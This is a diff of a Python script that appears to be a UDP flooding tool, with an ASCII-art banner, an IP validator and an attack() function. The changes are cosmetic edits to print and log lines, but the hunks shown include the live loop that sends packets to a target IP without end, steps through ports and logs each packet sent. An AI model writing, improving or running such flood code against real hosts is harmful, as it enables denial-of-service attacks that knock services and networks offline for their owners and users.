@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
 import os
 import sys
 import time
@@ -35,8 +34,6 @@ logo = """
 ▒▒▒▒╚════╝▒╚════╝▒╚╝▒▒╚═══╝╚╝▒▒▒▒▒╚═════╝╚╝╚═╝▒▒▒▒╚═╝▒▒▒▒▒╚═╝▒▒▒▒╚═╝▒▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\033[0m
 """
-print(f"\033[97m ╔{'═' * 20}╗")
-
 # Validate target IP
 def validate_ip(ip: str):
     try:
@@ -54,10 +51,8 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             time.sleep(2)
-            print()
             sent += 1
-            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[33m•> {ip} \033[93mPort:\033[37m•> {port} \033[36msent•> {sent} \033[94mthreads\033[38;5;220m•> {threading.get_ident()}\r")
-            print("")
+            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[93m•> {ip} \033[37m[{port}] \033[36m[{sent}] \033[94mthreads\033[38;5;220m•> {threading.get_ident()}\r")
             log_message(f"\033[38;5;220mIp Address\033[94m•> {ip} \033[32mport\033[31m•> {port} \033[32msent•> {sent} \033[93mnum\033[37m•> {rate_limit}\r")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
